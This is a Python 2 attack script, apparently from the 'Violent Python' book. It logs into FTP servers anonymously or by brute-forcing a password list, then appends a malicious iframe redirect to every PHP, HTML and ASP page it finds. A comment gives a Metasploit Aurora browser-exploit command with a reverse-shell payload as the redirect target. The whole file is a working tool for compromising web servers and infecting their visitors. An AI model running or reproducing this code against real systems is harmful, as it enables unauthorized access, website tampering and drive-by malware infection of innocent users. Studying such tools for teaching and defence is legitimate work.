import ftplib
import optparse
import time

def anonLogin(hostname):
	"""Attempt anonymous login against target"""
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@your.com')
		print "[*] " + str(hostname) + " FTP Anonymous Logon Succeeded."
		ftp.quit()
		return True
	except Exception, e:
		print "[-] " + str(hostname) + " FTP Anonymous Logon Failed."
		return False


def bruteLogin(hostname, passwdFile):
	"""Attempt brute force login against target with given password file
	Credentials should be in the form 'username:password', one pair per line
	"""
	pFile = open(passwdFile, 'r')
	for line in pFile.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: " + userName + "/" + passWord
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName, passWord)
			print "[*] " + str(hostname) + " FTP Logon Succeeded: " + userName + "/" + passWord
			ftp.quit()
			return (userName, passWord)
		except Exception, e:
			pass

	print "[-] Could not brute force FTP credentials"
	return (None, None)


def returnDefault(ftp):
	"""Return an array of *.php*, *.htm* and *.asp*"""
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print '[-] Could not list directory contents.'
		print '[-] Skipping to next target.'
		return
	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+] Found default page: ' + fileName
			retList.append(fileName)
	return retList

def injectPage(ftp, page, redirect):
	"""Inject the redirect into the provided page on the provided ftp server"""
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded Page: ' + page
	f.write(redirect)
	f.close()

	print '[+] Injected Malicious IFrame on: ' + page
	ftp.storlines('STOR ' + page, open(page + '.tmp'))
	print '[+] Uploaded injected page: ' + page

def attack(username, password, tgtHost, redirect):
	"""Attack a given target with provided credentials
	Scan the target for default pages
	Inject the redirect into each default page
	"""
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)

	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defPage, redirect)


def main():
	epilogue = """* Attack ftp servers on given hosts with a given password file.
				* Attempt to inject the redirect iframe into htm, asp and php files.
				* Redirect target should be running the real attack (Metasploit).
				--violent python"""

	# Example Metasploit redirection destination:
	# 	msfcli exploit/windows/browser/ms10_002_aurora LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112 LPORT=443 E

	parser = optparse.OptionParser('usage: %prog -H <target host[s]> -r <redirect page> [-f <userpass file>]', epilog=epilogue)
	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify user:password file')
	parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')

	(options, args) = parser.parse_args()

	tgtHosts = str(options.tgtHosts).split(',')
	passwdFile = options.passwdFile
	redirect = options.redirect

	if tgtHosts == None or redirect == None:
		print parser.usage
		exit(0)

	for tgtHost in tgtHosts:
		username = None
		password = None

		if anonLogin(tgtHost) == True:
			username = 'anonymous'
			password = 'me@your.com'
			print '[+] Using anonymous creds to attack'
			attack(username, password, tgtHost, redirect)
		elif passwdFile != None:
			(username, password) = bruteLogin(tgtHost, passwdFile)
			if password != None:
				print '[+] Using creds: ' + username + "/" + password + " to attack"
				attack(username, password, tgtHost, redirect)

if __name__ == "__main__":
	main()
